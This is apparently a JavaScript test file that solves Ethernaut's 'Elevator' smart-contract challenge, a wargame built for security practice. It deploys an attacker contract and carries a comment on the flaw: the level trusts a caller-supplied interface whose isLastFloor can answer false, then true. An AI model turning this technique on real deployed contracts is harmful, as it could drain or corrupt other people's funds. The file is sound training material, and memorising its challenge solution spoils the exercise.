const ElevatorFactory = artifacts.require('./levels/ElevatorFactory.sol')
const Elevator = artifacts.require('./levels/Elevator.sol')
const ElevatorAttacker = artifacts.require('./attacks/N11ElevatorAttacker.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")
const chai = require("chai")
const { solidity } = require("ethereum-waffle")
chai.use(solidity);


describe("Challenge 11 - Elevator", function () {
    let ethernaut
    let level
    let instance
    let attacker

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await ElevatorFactory.new()

        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Elevator,
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("can not reach the top", async function () {
            expect(await instance.top()).to.be.false
            await expect(instance.goTo(100)).to.be.reverted
        })
    })

    describe("Attack Execution", function () {
        /*
            This level initializes an interface with the address of the user.
            
            Bad idea, because we can write a contract and give any
            arbitrary functionality to the functions that interface exposes.

            In this case we will cause isLastFloor function to return
            a false and then, when it is called next time, a true
            to pass this challenge.
         */

        it("take elevator to top floor", async function () {
            expect(await instance.top()).to.be.false
            const maliciousContract = await ElevatorAttacker.new(instance.address)

            await maliciousContract.breakElevator()
            expect(await instance.top()).to.be.true
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})